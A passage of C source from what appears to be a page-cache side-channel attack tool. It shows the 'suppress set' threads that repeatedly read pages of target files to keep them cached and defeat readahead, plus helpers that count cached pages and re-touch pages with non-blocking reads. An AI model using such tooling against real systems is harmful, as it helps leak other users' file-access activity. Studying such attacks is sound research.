        .running_ = 1,
        .ss_ = &attack->suppress_set_,
        .sleep_time_us_ = attack->suppress_set_.access_sleep_time_us_};

    // readahead surpressing threads for target
    for (size_t t = 0; t < attack->suppress_set_.access_thread_count_; t++)
    {
        thread_data = dynArrayAppend(&attack->suppress_set_.access_threads_, &thread_data_template);
        if (thread_data == NULL)
        {
            DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }

        if (pthread_create(&thread_data->tid_, NULL, suppressThread, thread_data) != 0)
        {
            thread_data->running_ = 0;
            DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            goto error;
        }
    }

    return 0;

error:

    dynArrayDestroy(&attack->suppress_set_.access_threads_, closePageAccessThreadSSData);
    return -1;
}

void activateSS(DynArray *suppress_set, int use_file_api)
{
    TargetFile *current_target_file = NULL;
    PageSequence *page_sequences = NULL;
    size_t page_sequences_length = 0;
    volatile uint8_t tmp = 0;
    (void)tmp;

    for (size_t t = 0; t < suppress_set->size_; t++)
    {
        current_target_file = dynArrayGet(suppress_set, t);

        page_sequences = current_target_file->target_sequences_.data_;
        page_sequences_length = current_target_file->target_sequences_.size_;

        for (size_t s = 0; s < page_sequences_length; s++)
        {
            for (size_t p = page_sequences[s].offset_; p < page_sequences[s].offset_ +
                                                               page_sequences[s].length_;
                 p++)
            {
                /*DEBUG_PRINT((DEBUG SS_TAG WORKER_TAG INFO "Accessing offset %zu, %zu length...\n",
                             pthread_self(), page_sequences[s].offset_, page_sequences[s].length_));*/
                // activate
                fileMappingActivate(&current_target_file->mapping_, p * PAGE_SIZE, use_file_api);
            }
        }
    }
}

void *suppressThread(void *arg)
{
    PageAccessThreadSSData *thread_data = arg;
    AttackSuppressSet *ss = thread_data->ss_;

    DEBUG_PRINT((DEBUG SS_TAG WORKER_TAG INFO "Worker thread started.\n", pthread_self()));
    while (__atomic_load_n(&thread_data->running_, __ATOMIC_RELAXED))
    {
        activateSS(&ss->suppress_set_, ss->use_file_api_);
        osal_sleep_us(thread_data->sleep_time_us_);
    }
    DEBUG_PRINT((DEBUG SS_TAG WORKER_TAG INFO "Worker thread stopped.\n", pthread_self()));

    return NULL;
}

/*-----------------------------------------------------------------------------
 * OTHER HELPER FUNCTIONS
 */
size_t fcaCountCachedPages(uint8_t *pages_cache_status, size_t size_in_pages)
{
    size_t cached = 0;

    for (size_t p = 0; p < size_in_pages; p++)
    {
        cached += (pages_cache_status[p] & 1);
    }

    return cached;
}

inline void fileMappingActivate(FileMapping *mapping, size_t offset, int use_file_api)
{
    volatile uint8_t tmp = 0;

    if (use_file_api)
    {
#ifdef __linux
        // three times works best
        if (pread(mapping->internal_.fd_, (void *) &tmp, 1, offset) != 1 ||
            pread(mapping->internal_.fd_, (void *) &tmp, 1, offset) != 1 ||
            pread(mapping->internal_.fd_, (void *) &tmp, 1, offset) != 1)
        {
            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
        }
#elif defined(_WIN32)
        // TODO implement
#endif
    }
    else 
    {
        tmp = *((uint8_t *) mapping->addr_ + offset);        
    }
}

inline void fileMappingReactivate(FileMapping *mapping, size_t offset)
{
    volatile uint8_t tmp = 0;
    (void) tmp;

#ifdef __linux
    struct iovec iov = {
        .iov_base = (void *) &tmp,
        .iov_len = 1
    };

    if (preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1 ||
        preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1 ||
        preadv2(mapping->internal_.fd_, &iov, 1, offset, RWF_NOWAIT) != 1)
    {
        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
    }
#elif defined(_WIN32)
        // TODO implement
#endif
}